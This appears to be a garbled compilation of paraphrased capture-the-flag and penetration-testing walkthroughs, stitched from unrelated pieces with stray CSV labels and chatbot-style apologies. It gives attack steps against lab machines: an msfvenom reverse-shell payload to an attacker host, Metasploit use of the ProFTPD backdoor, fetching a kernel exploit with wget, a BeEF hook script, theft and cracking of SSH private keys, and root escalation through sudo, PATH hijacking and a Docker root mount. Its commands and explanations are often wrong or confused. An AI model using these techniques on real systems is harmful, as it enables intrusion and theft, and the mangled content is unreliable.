To Shenron Systems' Management Team,

I hope this message finds you well. I am writing to inform you of my recent findings while exploring Shenron's systems. Among the files in the user home directory, I discovered a script named ""network"" that requires root privileges to execute. When run, the output indicates that the script is simply executing the netstat command.

The output appears to be a command line interface output and may not be easily understandable by non-IT personnel. However, in simpler terms, it seems to be related to a file called ""local.txt"" and an encryption method called AES-256. The command ""cat local.txt"" is used to display the contents of the file, while ""a57e2Ff676cd040d58b375f686c7cedc"" could be a unique identifier or password associated with the encryption method.

I will continue my investigation and keep you updated on any new findings. Please let me know if you have any questions or need further clarification.

2. Escalating privileges to gain root access.

Now that we have all the necessary information, let's proceed with the challenge. After running the virtual machine in VirtualBox, it will automatically receive an IP address from the network DHCP server. The target machine's IP address will be visible on the login screen and can be seen in the screenshot below.

The target machine's IP address is 192.168.1.24, and we will use 192.168.1.25 as the attacker machine IP address where required. Note that the target machine's IP address may differ in your case, as it is assigned by the network DHCP server. We do not need to run the Netdiscover command to obtain the target IP address as it will be displayed on the screen automatically.

Next, we will find out the open ports and services available on the target machine. To achieve this, we will use the Nmap tool, which is effective and comes pre-installed with Kali Linux. The results can be seen below:

Now that we have identified the open port (8080), let's begin enumerating the target machine by exploring the HTTP port 8080. We will access the target machine's IP address through a web browser, as shown below:

A web application is running on the target machine, and from the text, we can assume it is a banking application. There is a login form available on the homepage. For this step, we will use the Dirb tool, which is widely used for web application file and directory enumeration."

However, the text hints at a potential security issue with the server and refers readers to <https://owasp.org/www-pdf-archive/Shellshock - Tudor Enache.pdf> for more information.

It's mentioned that the issue might be related to the presence of a shell script on the machine, with the filename being 'shell.sh.' To test this, one can use the 'dirb' tool with the following command: dirb <http://10.0.0.5/cgi-bin> -X .sh vl.

When the payload gets to the target, it turns off error reporting and connects to a server controlled by the attacker, where it then runs the harmful code."
1203,Executing,"The objective of this task is to execute code remotely on the target computer. To achieve this, the tool first sets the remote host to ""192.168.1.101"" and the URI to ""/cms/"".

Now that we have WordPress installed on the target machine, it's time to move forward and gain shell access. To do this, we can use the php/meterpreter/reverse TCP payload generated by msfvenom with the lhost set to 192.168.0.104 and lport set to 4444. The command provided is:
```perl
msfvenom -p php/meterpreter/reverse tcp lLhost=192.168.0.104 lport=4444 -f r
```
The output of the command indicates that no platform or encoding was explicitly selected, so msfvenom used default settings. This means that the payload will work on a wide range of platforms and will be encoded in a way that is compatible with most systems.

Once we have generated the payload, we can use it to gain shell access to the target machine by injecting it into a vulnerable WordPress plugin or theme file, as discussed earlier. This will allow us to execute arbitrary code on the target machine and gain full control over the system."

Phase 4: Exploitation (Metasploit Framework)

After identifying and validating a potential target using Nmap and/or other vulnerability scanning tools, we can proceed with the exploitation phase to take advantage of any discovered vulnerabilities. The Metasploit Framework is commonly used for this purpose. Here's how to proceed:

1. Identify an appropriate exploit module: Given the target system information, select a suitable exploit module from the Metasploit Framework's extensive database. In our case, we will use the ""proftpd 133c backdoor"" exploit module. This module targets vulnerabilities in ProFTPD version 1.3.3c, allowing us to gain unauthorized access to the target system.
2. Set up the Metasploit Framework: Launch Kali Linux and navigate to your preferred terminal emulator. Install the Metasploit Framework if it is not already installed by running the following command:
```arduino
sudo apt update && sudo apt install metasploit-framework
```
1. Configure the Metasploit Framework: Launch the Metasploit Framework with the following command:
```
msfconsole
```
2. Select the appropriate module: In the Metasploit console, type ""show exploits"" and press Enter to view the available exploit modules. Search for the ""proftpd 133c backdoor"" module by typing its name or part of it and pressing Enter. Once you locate the module, type ""use proftpd/133c\_backdoor"" and press Enter to select and run the module.
3. Set the target system information: After selecting the exploit module, you will need to set the RHOST (Remote Host) to the IP address of your target system. In our example, the IP address is 192.168.30.5. Type ""set RHOST 192.168.30.5"" and press Enter to set the RHOST value.
4. Set the target port: Since we are exploiting an FTP service, the target port is 21 (TCP). Type ""set RPORT 21"" and press Enter to specify the target port.
5. Launch the exploit: With the target system information set, type ""run"" and press Enter to execute the exploit module. The Metasploit Framework will attempt to exploit the vulnerability on the target system.
6. Interact with the compromised system: If the exploit is successful, you will gain unauthorized access to the target system. You can now interact with the compromised system through the Metasploit console, issuing commands or modules as needed to achieve your objectives (e.g., running post-exploitation payloads or additional modules).

It is important to note that exploiting vulnerabilities without proper authorization is illegal and unethical. This demonstration serves educational purposes only. Always use these techniques responsibly and within the bounds of the law."

It includes several terms and phrases that may not be immediately understandable by non-IT people, such as ""setuid,"" ""GLIBC\_2.2.5,"" and ""deregister\_tm\_clones."" However, the general idea seems to be about executing a script or program called ""manage.sh"" using GCC (GNU Compiler Collection) version 10.2.0 on a Debian operating system. The content also mentions several files and functions related to C programming language, such as ""crtstuff.c,"" ""get.c,"" and others. Overall, the content is specific to computer programming and may not be easily understandable by those without technical knowledge in this area. This is a script written in the Bash programming language, which allows users to execute commands and automate tasks on a Linux operating system."
1548001,Setting,"In the second step, from the remote machine, you can simply execute the newly copied sh file in privileged mode by typing www-data@ubuntu: /home/shivay$ ./sh -p. The provided text shows a series of computer commands or instructions, possibly written in a scripting language, being executed on an Ubuntu system.

The command ""ls -al sh"" lists the permissions, ownership, and size of a file named ""sh"". The output indicates that the file is owned by the ""root"" user with read, write, and execute permissions for the owner, and only read and execute permissions for others. The next line shows the result of running a script named ""whoami"", which prints out the current user's name (in this case, ""root"").

The content www-data@ubuntu:/home/shivay$ ./sh -p suggests that the system is executing a command with elevated privileges. The subsequent lines include various combinations of letters and symbols that likely represent commands for a computer program. The last line, ""contact us here,"" suggests that this content may be related to a completed project or task, and provides contact information for further communication."
1548001,Setting,"However, it is unclear what the purpose of this information is or how it relates to sensitive files such as /etc/group or /etc/shadow. The following files have SUID permissions: <file1>, <file2>. The possibly interesting SUID file is /home/user5/script with root privileges. The provided content is a log of commands entered in a Linux terminal. The first command imports the ""pty"" module and then spawns a new instance of the ""/bin/bash shell""."
1548003,Elevating,"Following the previous steps, we were able to enter a message and start a bash shell by entering ""bash"". We then checked our identity using the ""whoami"" command and confirmed that we were now logged in as user ""thor"". Next, we used the ""sudo -l"" command to check the sudo privileges for the current user and found that user ""thor"" was allowed to run a few commands as root. With this information, we decided to execute the command to gain root access by entering the ""id"" command. Upon checking, we confirmed that we were now successfully logged into the target machine as root."
1548003,Elevating,"
The provided output is not clear and lacks context. It appears to be a mix of different commands and their outputs, which makes it difficult to understand the purpose or goal of the script.

To rephrase the given information in a more coherent manner, I would need more details about the script or a clearer explanation of the desired outcome. The output seems to involve user information, shell access, and possibly some input prompts, but without additional context it is difficult to provide a clear summary."

The content is a Linux system's output for a sudo command, specifically showing that the user ""thor"" has been granted permissions to run certain commands without entering a password, including running the ""/usr/bin/cat"" command as root. Additionally, it lists some default settings for the user thor, such as the secure path and environment reset. Overall, the content describes the access privileges that user thor has on the system through the sudo command. The user thor can run the following commands: `sudo` permissions of the user thor i. This information could lead to RPE. The given text is a Bash shell command input used for controlling a computer's behavior. The user is using the ""sudo"" command to execute a script called ""hammer.sh"" as the user ""thor"". The system prompts the user to enter a secret key to verify their identity and then displays information about the user's account, including their username, user ID (uid), group ID (gid), and associated groups."
1548003,Elevating,"The next line, ""sudo service ../../bin/bash,"" is a similar command with an additional option. The following lines, ""sudo -1,"" and ""sudo -1,"" are related to setting user permissions and authentication on the system. The ""Matching Defaults entries for root on HackSudoThor"" section lists some security-related settings that apply to the ""root"" user account on this system."
1548003,Elevating,"We can confirm that we have successfully assumed the role of user thor. However, upon observation, we see that services can also be executed by others. As a result, we enter the command ""sudo service ../../bin/bash"" to ensure that we are executing the service as a privileged user. We repeat this process several times to confirm its efficacy."
1550004,Cookieing,"In summary, the search results suggest that there are potential security risks associated with using BlogPHP and users should take appropriate measures to safeguard their websites and data. To conduct web application security testing using BeEF, it is necessary to first start the BeEF services by waiting for a few seconds before opening the UI in your browser by visiting <http://127.0.0.1:3000/ui/panel>. To make use of the hook feature in BeEF, include a script tag with the URL ""<http://<IP>:3000/hook.js>"" in your HTML code, where ""<IP>"" represents the IP address of the server running BeEF."
1552001,Credentialing,"In this terminal session, the user navigates to the ""/media"" directory and uses the ""ls -al"" command to display a list of 24 files and directories. The output shows a ""cdrom"" folder and a file called ""creds"". The user then opens the ""hints"" file which contains a link to a website about a data exfiltration tool. However, the user is not sure how to use this hint. After reading the article multiple times, they realize that there must be a cloaked or encrypted file somewhere on the machine and they need to decode it. But they are unable to find the file."
1552001,Credentialing,"We have obtained a password named ""wealllikedebian"". The command ""apt install ngircd <3"" is installing the ngircd software on a Kali Linux operating system. This process entails examining package lists, developing a dependency tree, and evaluating state information to identify the necessary packages for installation."
1552001,Credentialing,"Once the necessary steps have been completed, the installation process can proceed. In this context, the user is exploring the directory of an IRC daemon called ngIRCd. The user lists the files within the directory and then examines the configuration file, which includes comments indicating that it must be customized to suit local preferences and requirements. This configuration file pertains to the ngIRCd server, a tool designed for hosting Internet Relay Chat (IRC) networks. The file contains information about the IRC network the server is part of, such as its name and password. When clients connect to the server, they will receive the network name if one has been specified. Additionally, a global password is mandatory for all users to access the server, which can either be set or left empty within the configuration file."
1552001,Credentialing,"Additionally, the PidFile setting specifies where the server's process ID will be written to a file, which must exist in the chroot directory and be writable by the ngIRCd user. HexChat was used to connect to the target machine using the default password provided by ngIRCd. After connecting, it prompted us to join a channel, and we used the channels games & tormentedprinter with us. The latter had some important information for us. HexChat is a program that enables users to connect to chat servers and communicate with others in real-time. The program offers various features, including adding or removing servers, editing server settings, and connecting to channels automatically. Users can also customize their nickname, real name, username, login method, and password."
1552004,Keying,"To gain SSH access using this key, you can run a command like ""ssh -Iroot -p22 -i /home/hitz/keys/ba7a6b3be3dac7dcd359w20b4afd5143-1121 192.168.1.240"". The content appears to describe an attack on a computer with IP address 192.168.1.23 and port number 10000. The attacker employs Perl code to target the file /home/obama/.ssh/authorized\_keys, which stores encrypted keys used for secure remote access. The attacker seems to have successfully accessed the file's contents and shared them in the message. They also express a preference for working with Perl over PHP for such tasks."
1552004,Keying,"
However, it should be noted that encoded strings are frequently utilized in IT and technology contexts for various purposes such as data security, privacy, or efficient communication of sensitive information. The content provided seems to be a collection of encrypted email addresses and their corresponding decryption keys. The encryption method employed is known as RSA, which employs a public key for encrypting the message and a private key for decrypting it."
1552004,Keying,"Phase 1:
Each email address has a unique pair of public and private keys that are used to securely exchange messages without anyone else being able to read them. This is similar to how two computers can establish an encrypted connection over the internet using a command such as ""openssl s_client"". In this example, the user ""obama"" is using the computer ""kali"" with the operating system ""Ubuntu"" and attempting to connect to another computer at IP address ""192.168.1.23"". The connection uses a digital certificate for authentication and encryption, which is stored in a file called ""rsa/2048/dcbe2a56e8cdea6d17495f6648329ee2-4679"" on the computer ""kali"".

Phase 2:
The digital certificate is a file that contains information about the identity of the computer or organization that it belongs to, as well as its public key. When a user tries to connect to another computer using this certificate, the receiving computer can use the public key to verify the authenticity of the sender and establish an encrypted connection. This ensures that any messages exchanged between the two computers are secure and cannot be intercepted or read by anyone else.

Phase 3:
The command ""openssl s_client"" is used to initiate a secure connection with another computer using SSL or TLS encryption. It can be used to test the security of a website, verify the identity of a server, or establish a secure connection for remote access or file transfer. In this case, the user ""obama"" is using the command to connect to another computer at IP address ""192.168.1.23"", which may be a web server, database server, or other type of networked device.

Phase 4:
Once the connection has been established, the user can securely exchange messages with the remote computer using SSL or TLS encryption. This ensures that any data sent between the two computers is protected from interception or tampering by unauthorized parties. The command ""openssl s_client"" allows the user to view information about the connection, including the SSL or TLS protocol version being used and any errors or warnings that may occur during the process."

1556003,Authenticating,"The content appears to be a series of commands and their outputs when executed on a Linux system, with no apparent context or purpose. The first command changes the current working directory to ""/etc"". The second command sets the password for user ""root"" by making an HTTP request to ""<http://192.168.0.12:8000/passwd>"" and then saving it to a file called ""passwd"".

The content depicts a person utilizing the ""meterpreter"" tool for interacting with a computer system. The user navigates to the "".ssh"" directory, which is employed for secure shell communication, and enumerates its contents. Two files are found, namely ""id_rsa"" and ""id_rsa.pub,"" both of which pertain to encryption keys. Subsequently, the ""id_rsa"" file is transferred to the user's local computer's desktop.
```"
1563001,Overriding,"The following steps seem to involve moving a private key file for secure access to a remote device using the Meterpreter tool, which is part of the Metasploit Framework. The command `meterpreter > download id rsa /root/Desktop/` seems to be downloading a private key file called `id_rsa` to the `/root/Desktop/` directory on the remote device."

1. Download the ""id rsa"" file from a remote server using the SSH protocol.
2. The downloaded file is located in the ""/root/Desktop/"" directory.

4. The first line mentions a file called ""ssh2john"" located in the ""/usr/share/john/"" directory.
5. The following lines provide additional information about the location of the ""ssh2john"" file and its associated cache file, as well as a command to use the tool to crack RSA SSH hashes."
1563001,Overriding,"The session has now been completed. After switching to Thales user, we used the `id` command to determine the real and effective user and group IDs. We discovered that Thales is a non-root user. We then employed ""sudo -I"" to explore which commands could be executed as root by the user Thales. It was determined that the user Thales does not possess the ability to run any command as root. Now, we are navigating around in search of some captivating files. A clue is found on note.txt indicating a backup script has been prepared for us in the directory /usr/local/bin/backup.sh. The content displays a series of commands executed on a computer, including starting a remote terminal session and employing the ""sudo"" command to execute a command with heightened privileges."
1570,Transferring,"The problem has been confirmed by EDB and can be exploited through a vulnerable application. We will download this exploit onto our machine and then transfer it to the remote machine. However, before transferring, we need to start a Python server on our machine using ""python3 -m http.server"" to serve the file to the remote machine. Once the server is running, we can use wget to transfer the exploit to the remote machine by navigating to the /tmp directory on the remote box and downloading it from ""<http://10.0.2.15:8000/overLlayfs.c>"". Once the download is complete, our Python server will receive a connection request, indicating that the transfer was successful. This is a command prompt from a computer running the Python programming language, where the ""python3 -m http.server"" command creates a simple HTTP server that listens for incoming connections on all available network interfaces (0.0.0.0) and port 8000. When someone visits ""<http://0.0.0.0:8000/>"" in their web browser, they can see the contents of a file named ""37292.c""."
1570,Transferring,"The user is currently logged in to a Ubuntu virtual machine, as shown by the display of the home directory (""/home/vmware"") when they run the ""cd"" command. The user then copies a file named ""shell.cgi"" from the temporary folder to the current working directory using the ""cp"" command. This action creates a copy of ""shell.cgi"" in the current working directory, which can be viewed by listing the files and folders in that directory with the ""ls"" or ""dir"" command."
1509,Diverging,"This generates a fresh terminal window where various system commands are executed, such as ""find"", ""mount"", and ""pppd"". These commands pertain to network configuration and security settings. Furthermore, there is a reference to a script located in the user's home directory, as well as a mention of operating in ""pssruser"" mode, which necessitates caution. In general, this material is technical and specific to Linux command-line usage."
1574,Flowing,"I apologize for any confusion in my previous response. To clarify, ""/bin/In -s file netstat"" is actually a single command, not three separate commands separated by periods. The command ""netstat"" is used to display network-related information about the system and is invoked with the contents of the ""file"" that was created earlier as its input.
The purpose of this command is to extract data from the contents of the file and use it to perform a specific operation related to network statistics. The specific details of the operation depend on the context and the intended usage of the script.
Regarding the last command ""ff"", it's unclear what it does as there are multiple possible interpretations depending on the context, as mentioned in my previous response."
1574,Flowing,"Overall, these directories and files collaborate to guarantee the seamless operation of Redis on a system. The content seems to be from a command line interface (CLI) session where the user is executing multiple commands. The initial two commands appear to involve downloading files from an IP address, with one of them being stored as ""shell"". The subsequent command modifies the permissions of the file ""shell"" to enable execution from the command line."
1574,Flowing,"In summary, there are four connections listed on the system, including one using TCP with a local address of 127.0.0.1:3306 and a foreign address of 127.0.0.53, which is likely MySQL; another using TCP with a local address of 127.0.0.53:53 and a foreign address of 127.0.0.53, which is likely systemd-resolve; one using HTTP with a local address of ::80 and no foreign address, which is likely Apache2; and one using UDP with a local address of 192.168.56.114:68 and a foreign address of 0.0.0.0, which is likely systemd-network. To force the script to execute the bash command over netstat, we simply need to modify the machine's environment PATH variable and create a symbolic link between a file containing a bash command and the netstat command."
1588002,Tooling,"To build the software module, follow these steps:
1. Clone the Github repository to your local machine.
2. Navigate to the directory containing the repository.
3. Use the Make command in terminal to build the module.so file. This will compile various parts of the module, such as util.c, strings.c, sds.c, vector.c, alloc.c, and periodic.c into executable files using gcc, with various flags to optimize the code and check for errors.
4. The final step is to run Redis with the command ""/path/to/redis-server --loadmodule /module.so"" to load the module."

We then use Nmap to see which services are running on Thor's IP address. The text appears to be a log of an Nmap scan, which is a tool used to scan networks and determine which ports are open or closed on a specific host."

1. Abeait Wi Home Menu Content: Accessing the home menu of a website often reveals directories and folders that can be explored further using tools like DirBuster. Nmap can also be used to identify open ports on the target machine, which may provide additional information about the system's architecture.

1595,Scanning,"""Firstly, let's begin by identifying the IP address of the target machine. Before starting the virtual machine, it's essential to configure your own machine's network settings to use a Host-only Adapter, and verify that the adapter's name matches vboxneto in this case.""

""To accomplish this, we can utilize a tool called arp-scan, which allows us to scan for and find the IP address of the victim machine quickly and easily."""

* The ""arp-scan"" program, version 1.9.7, was used to scan up to 256 devices on the network. Two devices were found with the names ""ib"" and ""08:00:27:85:bd:73."" The program took 2.019 seconds to complete, scanning a total of 256 hosts and finding 2 responding hosts.
* Using the IP address found in the previous step, an Nmap scan was conducted on the IP address 192.168.56.101. The scan showed that the host is up and running with a latency of 0.000255 seconds. Out of 65532 ports scanned, only three are open: port 21 (FTP), port 22 (SSH), and port 80 (HTTP).
* The report also provides information about the version of services running on these open ports, along with details like device type, operating system, and network distance."

1595,Scanning,"The report concludes with 7915 requests and 12 items reported on the remote host, along with the time taken to complete the scan. The X-Content-Type-Options header is missing, which could allow the user agent to render the content. When encountering a web server or HTTP port, I always use Nikto. Although SSH on port 22 is commonly used for penetration testing, it's rarely used in practice. This leaves us with port 6379 and the Redis service as potential targets. While there are resources available to learn more about Redis, a quick Searchsploit search reveals some possible exploits, including one by roota at Kalis."
1595,Scanning,"The information is organized in a tabular format for better readability. Our scan (-A) was conducted aggressively to identify open ports. According to the Nmap results, there are two open ports on which services are running: port 22 has an SSH server (OpenSSH) operating, while port 8080 has an HTTP service (Apache tomcat)."

2. The Docker images available on the server are listed using ""docker images."" This output shows an Ubuntu image as being available locally.
3. To run a container using the Ubuntu image, the command ""docker run -it -v /:/mnt ubuntu"" is used. The ""-v /:/mnt"" flag specifies that the container's root directory should be mapped to the server's root directory (i.e., / on the server)."
